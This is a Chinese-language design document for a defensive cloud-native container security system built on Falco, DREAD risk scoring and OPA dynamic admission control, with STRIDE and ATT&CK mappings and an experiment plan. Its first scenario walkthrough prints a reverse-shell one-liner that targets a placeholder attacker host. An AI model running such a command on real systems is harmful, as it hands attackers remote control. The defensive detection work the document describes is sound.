# 基于Falco与OPA的云原生容器多步攻击检测与动态准入控制系统
> **项目名称**：基于Falco与OPA的云原生容器多步攻击检测与动态准入控制系统
## 摘要
针对Kubernetes集群中容器攻击检测存在告警孤立、链式攻击识别能力弱、静态准入策略缺乏应急响应能力的问题，本项目设计并实现一套融合运行时行为检测、时间窗口告警关联、DREAD风险评估、动态准入策略的云原生安全防护系统。系统依托Falco捕获容器系统调用行为，通过Webhook接收告警，对告警做标准化、时间窗口聚合与风险重评估；基于公共基础镜像降级机制，区分公共镜像与私有业务镜像，生成差异化OPA准入策略，搭配Pod应急驱逐能力，兼顾业务可用性与安全防护能力。本项目搭建Kind多节点K8s靶场，设计5组对照实验、12类攻击场景，每个场景独立重复10次，统计均值与标准差，验证系统对单步攻击与链式组合攻击的识别、处置能力。系统能力对标MITRE ATT&CK v16.1 Containers platform矩阵。
## 一、研究背景与意义
云原生架构下Kubernetes广泛应用，容器生命周期短、横向移动路径多。传统安全方案存在两个痛点：
1. 运行时告警相互独立，无法识别同一实体下多步链式攻击，低危告警组合后形成高危入侵时难以识别；
2. 准入策略静态固化，全部镜像统一拦截容易误杀公共基础镜像业务，缺少风险分级处置机制。
本项目构建一套运行时检测+风险评估+动态准入的闭环防护体系，在拦截恶意行为的同时，对公共基础镜像做降级处理，避免策略误阻断正常业务，为云原生容器安全提供轻量化防护方案。
## 二、系统总体架构
系统分为四层：容器运行时采集层、事件处理与风险评估层、策略引擎与应急处置层、可视化管理与审计层。
1. **容器运行时采集层**：Falco部署在K8s节点，监控容器系统调用，捕获容器shell创建、文件篡改、出站C2连接、权限提升、secret读取等行为，携带HMAC签名推送告警Webhook。
2. **事件处理与风险评估层**
   - **事件标准化**：过滤临时PID、容器ID等瞬时字段，提取镜像、ServiceAccount、命名空间、Pod标签等核心实体信息，并校验HMAC签名，丢弃伪造告警。
   - **时间窗口告警聚合与风险重评估模块**：对同一Pod/ServiceAccount/Namespace维护5分钟滑动时间窗口，参考NIST SP 800-61安全事件响应指南中事件关联时间窗口建议，同时结合云原生攻击链的典型行为时序设定；窗口时长可在系统配置中根据实际环境调整。将窗口内多条告警聚合，重新评估DREAD风险分数：取窗口内单事件最高DREAD分值作为基线，叠加加权修正项；当窗口内出现2条及以上不同类型告警时，总分上调，风险等级提升。
     > 局限性说明：本项目仅实现基于时间窗口+实体匹配的简单告警关联，暂不实现完整攻击图（Attack Graph）推理、因果攻击链溯源。完整攻击链推理作为未来工作（Future Work）阐述。
   - **DREAD风险打分**：对告警进行5维风险评估，输出风险等级。
3. **策略引擎与应急处置层**：内置公共基础镜像前缀列表，实现镜像类型识别；根据风险等级与镜像类型生成差异化OPA准入策略，同时调用Kubernetes API执行Pod驱逐应急操作。
4. **可视化管理与审计层**：提供Web面板，支持公共镜像前缀管理、告警查看、候选策略预览、人工策略审批，全链路事件持久化存入PostgreSQL用于溯源审计。
## 三、核心设计
### 3.1 告警处理与DREAD风险评估
DREAD模型包含5个评估维度：Damage（破坏潜力）、Reproducibility（可复现性）、Exploitability（可利用性/利用门槛）、Affected users（受影响范围）、Discoverability（可发现性）。每项取值1~5分，分值越高风险越大；总分区间5~25。
风险分级规则：
- 5~10：Info
- 11~15：Low
- 16~20：High
- 21~25：Critical
### 3.2 公共基础镜像识别与降级策略
公共基础镜像降级逻辑依赖公共基础镜像前缀列表，列表维护与镜像识别规则如下：
1. **初始内置列表**：内置`docker.io/library/`仓库下Top20官方基础镜像前缀，例如`docker.io/library/ubuntu`、`docker.io/library/alpine`、`docker.io/library/debian`、`docker.io/library/centos`等；
2. **管理方式**：支持管理员在可视化面板手动新增/删除镜像前缀，无需修改代码重启服务；
3. **镜像识别规则**：匹配镜像`registry/repository`前缀，忽略tag标签；例如`docker.io/library/python:3.11-slim`会匹配到`docker.io/library/python`前缀，判定为公共基础镜像；
4. **私有镜像判定**：私有仓库镜像（如`registry.example.com/app/backend:v1.2`）不命中内置前缀，默认判定为业务私有镜像；管理员可手动将私有仓库内基础镜像加入公共列表；
5. **局限性**：本系统仅识别镜像顶层仓库前缀，无法自动解析镜像底层依赖链（无法识别基于公共镜像二次打包的私有镜像）；如需完整镜像供应链溯源，需要与Trivy等镜像静态扫描工具联动。
> 降级机制：当告警来自公共基础镜像时，即使风险等级达到High，也不自动下发镜像黑名单，候选策略进入人工预审队列，仅执行Pod驱逐；私有业务镜像在Critical风险且Dry-run验证通过时，可自动下发镜像黑名单准入策略。
### 3.3 策略生成、冲突检测与Dry-run预校验
1. **策略模板引擎**：内置ServiceAccount黑名单、镜像黑名单两类Rego模板，根据实体信息填充模板生成候选OPA策略；
2. **结构级冲突检测**：检查目标命名空间内是否存在互斥deny/allow规则，避免策略冲突；
3. **Dry-run预评估**：调用OPA模拟执行候选策略，统计策略会影响的存量Pod数量，评估策略影响范围；影响范围过大时禁止自动下发，转入人工审批。
### 3.4 故障兜底机制
后端服务异常时，Falco告警持续采集并写入本地WAL（Write-Ahead Log）预写日志文件缓冲，但不会自动生成与下发准入策略，K8s集群原有准入规则保持不变，不影响业务运行；后端恢复后从WAL重放未处理告警，继续执行风险评估与策略推荐流程。PostgreSQL持久化存储不受后端服务重启影响。
## 四、端到端场景走查
### 场景走查1：公共基础镜像（nginx:latest）反弹Shell攻击（触发降级）
攻击场景：攻击者在`nginx:latest`容器内执行反弹Shell命令：
`bash -i >& /dev/tcp/attacker.com/4444 0>&1`
1. **事件采集与校验**：Falco捕获两类系统调用告警（交互式Shell创建、容器出站TCP连接到外部恶意地址），携带HMAC签名通过Webhook推送至后端，后端校验HMAC签名、校验来源IP，丢弃伪造请求。
2. **事件标准化**：解析原始告警，过滤一次性容器ID/PID，提取标准化实体：镜像`nginx:latest`，ServiceAccount=`default`，Namespace=`production`，Pod标签：`app:web`。
3. **单事件DREAD打分**：Damage=4，Reproducibility=5，Exploitability=4，Affected users=3，Discoverability=4；总分20，单事件判定为High风险。（Exploitability取4而非5：反弹Shell虽为一行命令，但需攻击者外部C2服务器可达作为前提，增加了利用门槛。）
4. **时间窗口聚合校验**：该Pod5分钟内无其他历史告警，聚合后风险等级维持High。
5. **实体维度选择与公共镜像降级**：`nginx:latest`命中内置公共基础镜像前缀，触发降级规则：禁止生成全局镜像黑名单；系统选择影响范围更小的实体组合：`ServiceAccount=default + Namespace=production`作为候选策略维度。
6. **策略模板生成**：填充对应ServiceAccount黑名单Rego模板，生成候选准入策略。
7. **结构级冲突检测 + Dry-run预评估**：
   - 结构检查：同命名空间不存在互斥deny/allow策略；
   - Dry-run模拟：该策略会拦截`production`命名空间下12个使用default SA的存量业务Pod；
   - 评估结果判定策略影响范围过大，禁止自动下发，候选策略转入人工预审队列。
8. **即时应急处置**：独立于准入策略流程，调用Kubernetes API驱逐当前失陷恶意Pod，写入完整审计日志。
9. **人工处置闭环**：安全管理员在可视化面板查看告警、候选策略与Dry-run影响报告；管理员修改策略Scope缩小范围，人工审核通过后策略版本V3正式生效；后续`production`命名空间使用default SA新建Pod会被OPA准入引擎拦截。
10. **日志审计**：全链路事件、策略变更、Pod驱逐操作持久化存入PostgreSQL，用于事后溯源。
### 场景走查2：私有业务镜像攻击（无降级，自动下发黑名单）
攻击场景：攻击者使用内部私有镜像`registry.example.com/app/backend:v1.2`，在Pod内执行反弹Shell。
1. **事件采集与校验**：Falco捕获交互式Shell+外连C2告警，带HMAC签名的Webhook推送至后端，签名校验通过。
2. **事件标准化**：提取实体：镜像`registry.example.com/app/backend:v1.2`，ServiceAccount=`app-sa`，Namespace=`backend`。
3. **单事件DREAD打分**：Damage=4，Reproducibility=5，Exploitability=4，Affected users=4（失陷SA `app-sa`在backend命名空间内可访问多个后端服务，影响面大于场景1的default SA），Discoverability=4；总分21 → Critical。
4. **时间窗口聚合校验**：该Pod5分钟内无其他告警，风险等级维持Critical。
5. **实体维度选择**：镜像前缀`registry.example.com/app/backend`不属于公共基础镜像列表，不触发降级；按优先级选择镜像维度生成黑名单策略。
6. **策略模板生成**：填充镜像黑名单Rego模板，生成候选准入策略。
7. **结构级冲突检测 + Dry-run预评估**：
   - 结构检查：同命名空间不存在互斥deny/allow策略；
   - Dry-run模拟：仅拦截使用`registry.example.com/app/backend:v1.2`镜像新建Pod，存量Pod不受影响；影响范围可控。
8. **自动策略下发（靶场Critical模式）**：Dry-run验证通过，自动下发该镜像黑名单策略。同时调用K8s API驱逐当前失陷Pod。
9. **策略生效**：后续任何新建Pod如果使用该私有镜像，会被OPA Gatekeeper准入机制直接拦截。
10. **审计日志**：全链路事件、自动策略下发、Pod驱逐操作持久化存入PostgreSQL。
> 对比说明：公共基础镜像案例仅驱逐Pod、策略进入人工预审；私有业务镜像案例可以自动生成镜像黑名单并自动下发，直观体现公共镜像降级机制的差异。
## 五、威胁建模与MITRE ATT&CK对标
### 5.1 STRIDE威胁建模
对系统进行STRIDE威胁分析，识别主要攻击面并设计对应缓解措施：
| 威胁类型 | 攻击场景 | 缓解措施 |
| --- | --- | --- |
| Spoofing（欺骗） | 攻击者伪造Falco Webhook告警，向系统注入虚假事件触发误拉黑 | Webhook接口启用HMAC签名校验 + 来源IP白名单校验，丢弃未签名/签名错误/非授权来源的请求 |
| Tampering（篡改） | 攻击者篡改传输中的告警事件内容（如修改镜像名称绕过黑名单） | HMAC签名保证消息完整性，任何字段篡改导致签名校验失败 |
| Repudiation（抵赖） | 攻击者或内部人员在安全事件后否认操作 | 全链路审计日志持久化存入PostgreSQL，策略变更记录版本快照，不可删除 |
| Information Disclosure（信息泄露） | 容器内读取K8s Secret、ServiceAccount Token等敏感凭证 | Falco规则检测读取`/var/run/secrets`和访问kube-apiserver行为，高危事件触发Pod驱逐 |
| Denial of Service（拒绝服务） | 攻击者短时间触发大量低危告警，压垮后端处理服务 | 事件限流 + WAL本地缓冲削峰 + 异步消费；后端宕机时Falco和原有OPA策略独立运行不受影响 |
| Elevation of Privilege（权限提升） | 容器逃逸获取宿主机权限、利用SA Token横向移动访问K8s API Server | OPA事前禁止特权容器和宿主机路径挂载；Falco运行时检测逃逸行为；SA Token异常访问触发即时驱逐 |
### 5.2 MITRE ATT&CK对标
本系统能力对标 MITRE ATT&CK v16.1，Containers platform。容器矩阵复用Enterprise矩阵的Technique ID，无独立版本编号。下表为系统可覆盖的攻击技术：
| ATT&CK ID | 攻击技术名称 | 检测能力 | 阻断/处置能力 |
| --- | --- | --- | --- |
| T1059.004 | Unix Shell | Falco检测容器内交互式Shell创建 | 驱逐Pod + 生成准入策略推荐 |
| T1552.007 | Kubernetes Secrets and Service Account Tokens | Falco捕获读取secret卷、访问kube-apiserver行为 | 驱逐Pod，生成ServiceAccount黑名单策略 |
| T1610 | Escape to Host（容器逃逸） | Falco检测特权容器、宿主机路径挂载行为 | OPA事前禁止特权容器；运行时告警+驱逐 |
| T1046 | Network Service Scanning | Falco检测容器内端口扫描行为 | 告警，高风险触发Pod驱逐 |
| T1071.004 | Application Layer Protocol: C2 Communication | Falco检测容器向外网恶意地址建立TCP连接 | 告警；私有业务镜像场景可生成镜像黑名单推荐 |
| T1204.002 | User Execution: Malicious Binary | Falco基于原始syscall捕获恶意二进制执行，不依赖Shell | 告警+驱逐恶意Pod |
| T1561.002 | Data Destruction: Host File Modification | Falco监控宿主机敏感路径写入操作 | 告警 |
| T1611 | Container Privilege Escalation | 检测容器内提权相关系统调用序列 | 告警+驱逐恶意Pod |
## 六、实验方案设计
### 6.1 实验环境
基于Kind搭建多节点Kubernetes靶场，部署Falco、OPA Gatekeeper、本项目后端服务，使用12类容器攻击场景，设置5组对照实验。
> 每个攻击场景独立重复执行10次，记录每次检测耗时、阻断结果、误报情况；计算每组实验指标的均值与标准差，降低单次实验随机误差，保证实验结果可复现。
### 6.2 5组对照实验
| 组别 | 配置 | 目的 |
| --- | --- | --- |
| 对照组0 | 无任何安全防护 | 绝对基线，量化攻击在无防御时的成功率 |
| 对照组1 | 仅Falco告警，无风险评估、无动态准入、无Pod驱逐 | 仅检测能力基线 |
| 对照组2 | Falco + 单告警DREAD打分，无时间窗口告警聚合 | 验证风险评估的价值 |
| 对照组3 | Falco + 单告警DREAD + 时间窗口聚合，无公共镜像降级机制 | 验证链式攻击识别的价值 |
| 实验组 | 完整系统（Falco + 时间窗口聚合 + DREAD评估 + 公共镜像降级 + OPA动态准入 + Pod应急驱逐） | 验证完整系统效果 |
### 6.3 12个标准化攻击场景
1. 容器内启动交互式Shell
2. 容器读取 `/etc/shadow` 敏感文件
3. 容器内反弹Shell（nc/bash TCP反弹）
4. 容器挂载宿主机敏感目录尝试
5. 容器内加载可疑内核模块
6. 窃取ServiceAccount Token，横向访问K8s APIServer
7. 特权容器尝试容器逃逸
8. 容器内DNS隧道异常通信
9. 容器发起对外C2异常外连
10. 使用公共基础镜像ubuntu:22.04发起攻击（验证公共镜像降级逻辑，不会拉黑ubuntu镜像）
11. 容器内端口扫描（T1046，检测容器内异常网络探测行为）
12. 链式组合攻击：同一Pod在5分钟内依次执行端口扫描(场景11, T1046) → 交互式Shell创建(场景1, T1059.004) → 读取ServiceAccount Token(场景6, T1552.007)，模拟"侦察→入侵→凭证窃取"真实多步攻击链；验证时间窗口聚合模块将多条低危告警组合识别为高危链式攻击并触发升级处置；该场景同时用于验证对照组2（无聚合）与对照组3（有聚合）的检测能力差异
### 6.4 评价指标
- **攻击检出率**：成功捕获攻击行为的次数占总攻击次数比例；
- **攻击阻断率**：成功拦截/处置攻击的次数占总攻击次数比例；
- **误报率**：正常业务行为被判定为告警的比例；
- **策略误阻断率**：正常业务Pod被准入策略拒绝的比例；
- **策略生效延迟**：从攻击行为触发到准入策略生效的耗时；
- **系统资源开销**：节点CPU、内存占用增量。
## 七、局限性与未来工作
### 局限性
1. 告警关联仅基于固定时间窗口+实体匹配，可识别同一Pod/SA/Namespace内的链式组合攻击（如场景12），但无法实现跨Pod、跨命名空间的攻击图推理与因果溯源；
2. 公共镜像识别仅匹配顶层镜像仓库前缀，不能自动解析镜像底层依赖链；
3. 不具备告警风暴防御、告警去重能力，大量短时间批量告警会加重后端负载；
4. 策略变更仅支持人工审批，未对接GitOps流程。
### 未来工作（Future Work）
1. 引入攻击图推理，实现多步攻击因果溯源；
2. 对接Trivy镜像扫描，获取镜像供应链信息，提升镜像类型识别准确度；
3. 增加告警风暴限流（令牌桶算法）、告警指纹去重；
4. 对接GitOps，策略变更提交Git仓库做版本管控；
5. 增加机器学习模型，进一步降低误报率。
## 附录：DREAD评分参考表
DREAD五维评分参考表（每项取值1~5分，5分为最高风险）

> **注意**：Exploitability（可利用性）分值越高 = 利用门槛越低、越易利用，风险越大。

| 维度 | 分值 | 判定规则 | 示例 |
| ---- | ---- | -------- | ---- |
| **Damage（破坏潜力）** | 5 | 可完整接管集群，持久化权限，横向扩散至多个命名空间 | 容器逃逸、获取集群管理员SA |
| | 4 | 攻陷单个Pod，窃取业务敏感数据，可发起对外C2通信 | 反弹Shell、读取Secret |
| | 3 | 本地Pod内破坏，无集群横向能力 | 篡改Pod内本地文件 |
| | 2 | 仅信息探测，无破坏能力 | 端口扫描（低危） |
| | 1 | 无害日志误报，无安全影响 | 正常程序文件读取 |
| **Reproducibility（可复现性）** | 5 | 攻击方法稳定，每次都能成功触发 | 标准反弹Shell命令 |
| | 4 | 绝大多数场景可复现，少数环境受限 | 容器内读取secret |
| | 3 | 需要特定条件才能触发 | 特定内核版本容器逃逸 |
| | 2 | 很难稳定复现，依赖特殊环境 | 罕见内核漏洞 |
| | 1 | 几乎不可复现，偶发异常 | 单次随机报错 |
| **Exploitability（可利用性/利用门槛，分值越高越易利用）** | 5 | 一行命令直接利用，无需权限/前置条件，无需外部依赖 | 本地提权（如利用SUID二进制） |
| | 4 | 普通攻击者可快速复现，不需要高级漏洞知识 | 容器内读取SA token |
| | 3 | 需要一定技术能力，查找漏洞、编写载荷 | 简单二进制提权 |
| | 2 | 需要高级漏洞研究能力、编写复杂EXP | 内核漏洞利用 |
| | 1 | 几乎无法利用 | 理论漏洞无可用EXP |
| **Affected users（受影响范围）** | 5 | 整个集群所有命名空间 | 集群级权限接管 |
| | 4 | 单个命名空间内大量业务Pod | backend命名空间业务应用 |
| | 3 | 命名空间内少量Pod | Web服务组 |
| | 2 | 仅当前单个失陷Pod | 独立测试Pod |
| | 1 | 无业务Pod受影响 | 临时调试Pod |
| **Discoverability（可发现性）** | 5 | 攻击者可主动探测，极易找到攻击入口 | 开放端口直接反弹壳 |
| | 4 | 攻击行为容易被攻击者发现 | Pod内默认挂载SA token |
| | 3 | 需要代码审计、内网探测才能找到入口 | 隐藏后端接口 |
| | 2 | 攻击入口隐蔽，很难发现 | 本地隐藏后门 |
| | 1 | 几乎无法被攻击者发现 | 内存级临时漏洞 |

> DREAD总分 = 5项分数相加；总分区间5~25。
> 分级规则：
> - 5~10：Info
> - 11~15：Low
> - 16~20：High
> - 21~25：Critical
>
> 注：场景走查中“反弹Shell”的Exploitability评定为4，对应上表分值4行（“普通攻击者可快速复现，不需要高级漏洞知识”）。未评为5是因为反弹Shell需要攻击者外部C2服务器可达作为前提条件，C2不可达则攻击失败，利用门槛高于5分所描述的“无需前置条件、无需外部依赖”的场景（如本地SUID提权）。
